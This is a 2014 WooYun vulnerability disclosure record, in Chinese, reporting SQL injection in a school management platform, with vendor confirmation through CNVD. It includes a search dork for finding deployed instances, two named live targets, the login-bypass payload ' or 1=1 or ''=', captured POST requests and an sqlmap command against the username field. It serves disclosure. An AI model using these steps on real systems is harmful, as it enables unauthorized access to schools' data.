{"id": 55811, "wybug_id": "wooyun-2014-059859", "wybug_title": "某通用型数字平台存在SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Mr.leo", "wybug_date": "2014-05-08 11:01", "wybug_open_date": "2014-08-06 11:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向公众公开  简要描述： 某通用型数字平台存在SQL注入漏洞 详细说明：  http://www.firstelite.net/index.asp西安博冠网络科技有限公司--网上阅卷系统、行政管理系统、教务管理系统、成绩管理系统、考核评价系统、后勤管理系统。旗下数字校园综合管理平台存在注入漏洞，必应搜索关键字， 数字校园综合管理平台  博冠科技 版权所有众多中小学都在应用这个平台http://www.google.com.hk/search?q=+%E6%95%B0%E5%AD%97%E6%A0%A1%E5%9B%AD%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0++%E5%8D%9A%E5%86%A0%E7%A7%91%E6%8A%80+%E7%89%88%E6%9D%83%E6%89%80%E6%9C%89&hl=zh-CN&newwindow=1&safe=strict&cad=&oq=+%E6%95%B0%E5%AD%97%E6%A0%A1%E5%9B%AD%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0++%E5%8D%9A%E5%86%A0%E7%A7%91%E6%8A%80+%E7%89%88%E6%9D%83%E6%89%80%E6%9C%89&gs_l=heirloom-serp.12...908.908.0.1453.1.1.0.0.0.0.0.0..0.0....0...1ac.1.34.heirloom-serp..1.0.0.7fmjMFtQOSI\n\n\n\n2个实例说明问题实例1：漏洞分析，访问此页面http://www.xaltedu.com:9001/Login.aspx，用户名密码输入' or 1=1 or ''='，页面提示密码错误，初步判定存在问题，故sqlmap跑下\n\ntxtUserName参数没有过滤，导致注入。burp抓包如下：\nPOST /Login.aspx HTTP/1.1Content-Length: 547Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.xaltedu.com:9001/Cookie: ASP.NET_SessionId=jspdjyu1mbcztuic3rzrojr2; .ASPXAUTH=Host: www.xaltedu.com:9001Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*btnStu=%e5%ad%a6%e7%94%9f%e7%99%bb%e5%bd%95&btnTea=%e6%95%99%e5%b8%88%e7%99%bb%e5%bd%95&chkUser=on&txtUserName=1&txtUserPass=g00dPa%24%24w0rD&__EVENTARGUMENT=&__EVENTTARGET=&__LASTFOCUS=&__VIEWSTATE=/wEPDwUJNDY4OTI3NzQxDxYCHgRHVUlEBSQzODE3N2ZmOS1hNmU5LTQ3ZmQtOTRhNi00OWFiMmI0NTk0MmMWAgIDD2QWBAIBDw8WAh4EVGV4dAUP5Li05r285pWZ6IKy5bGAZGQCAw9kFgICAQ8PFgIfAQUkMzgxNzdmZjktYTZlOS00N2ZkLTk0YTYtNDlhYjJiNDU5NDJjZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFB2Noa1VzZXKs%2bjvs0RN78zBpJYJKtQ7/AjiT0Q%3d%3d\n将抓包内容存入txt，指定用户名参数进行检测 Sqlmap -r d:\\post3.txt -p \"txtUserName\"\n\n   漏洞证明：  实例2：http://222.90.70.190:9001/Login.aspxburp抓包如下：\nPOST /Login.aspx HTTP/1.1Content-Length: 899Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://222.90.70.190:9001/Login.aspxCookie: ASP.NET_SessionId=s24t4hav0yqbji45vlzumw55; .ASPXAUTH=Host: 222.90.70.190:9001Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*btnStu=%e5%ad%a6%e7%94%9f%e7%99%bb%e5%bd%95&btnTea=%e6%95%99%e5%b8%88%e7%99%bb%e5%bd%95&chkUser=on&txtUserName=1&txtUserPass=g00dPa%24%24w0rD&__EVENTARGUMENT=&__EVENTTARGET=&__LASTFOCUS=&__VIEWSTATE=/wEPDwUKMTIyMDkzNTY3MQ9kFgICAw9kFgICAw9kFgQCCQ8PZBYCHgdvbmNsaWNrBawBamF2YXNjcmlwdDppZihzaG93TG9ja01lc3NhZ2UoJ%2bacjeWKoeWZqOS4iuayoeacieaJvuWIsOWPr%2beUqOeahOWKoOWvhumUgSzor7fogZTns7vljZrlhqDnp5HmioDmioDmnK/mlK/mjIHkurrlkZjov5vooYzlpITnkIbvvIEnKT09dHJ1ZSl7IHJldHVybiB0cnVlO31lbHNleyByZXR1cm4gZmFsc2U7fWQCCw8PZBYCHwAFrAFqYXZhc2NyaXB0OmlmKHNob3dMb2NrTWVzc2FnZSgn5pyN5Yqh5Zmo5LiK5rKh5pyJ5om%2b5Yiw5Y%2bv55So55qE5Yqg5a%2bG6ZSBLOivt%2biBlOezu%2bWNmuWGoOenkeaKgOaKgOacr%2baUr%2baMgeS6uuWRmOi/m%2bihjOWkhOeQhu%2b8gScpPT10cnVlKXsgcmV0dXJuIHRydWU7fWVsc2V7IHJldHVybiBmYWxzZTt9ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUHY2hrVXNlcs8rFAxpRc3Iu3p61JwqgZTfoyWj\n\n\n   修复方案：  过滤参数   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-11 21:11 厂商回复： CNVD确认并复现所述情况，已由CNVD通过公开联系渠道向软件生产厂商西安博冠网络科技有限公司通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}